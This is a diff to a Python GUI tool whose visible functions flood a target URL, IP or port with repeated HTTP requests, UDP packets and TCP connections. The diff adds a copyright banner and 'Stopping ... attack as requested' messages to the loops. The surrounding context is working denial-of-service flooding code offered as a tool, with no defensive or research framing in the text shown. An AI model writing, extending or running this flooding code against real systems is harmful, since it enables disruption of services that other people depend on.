@@ -1,3 +1,20 @@
+# *****************************************************************************
+# *                                                                           *
+# *   COPYRIGHT NOTICE                                                          *
+# *   -------------------                                                        *
+# *   This code is the intellectual property of Shikan-c. Unauthorized        *
+# *   copying, modification, or distribution of this code is strictly         *
+# *   prohibited. All rights reserved.                                         *
+# *                                                                           *
+# *   This software is provided "as is", without any warranty of any kind,    *
+# *   express or implied, including but not limited to the warranties of      *
+# *   merchantability, fitness for a particular purpose, or non-infringement.  *
+# *   In no event shall the authors or copyright holders be liable for any    *
+# *   claim, damages, or other liability, whether in an action of contract,    *
+# *   tort, or otherwise, arising from, out of, or in connection with the     *
+# *   software or the use or other dealings in the software.                   *
+# *                                                                           *
+# *****************************************************************************
 import tkinter as tk
 from tkinter import messagebox
 import requests
@@ -107,6 +124,7 @@ def send_http_request(url, packet_limit):
     """Send HTTP requests to the target URL."""
     for _ in range(packet_limit):
         if not attack_running:
+            print("Stopping HTTP attack as requested.")
             break
         try:
             response = requests.get(url)
@@ -118,6 +136,7 @@ def send_udp_packet(target_ip, target_port, packet_limit):
     """Send UDP packets to the target IP and port."""
     for _ in range(packet_limit):
         if not attack_running:
+            print("Stopping UDP attack as requested.")
             break
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
@@ -131,6 +150,7 @@ def send_tcp_connection(target_ip, target_port, packet_limit):
     """Send TCP connections to the target IP and port."""
     for _ in range(packet_limit):
         if not attack_running:
+            print("Stopping TCP attack as requested.")
             break
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
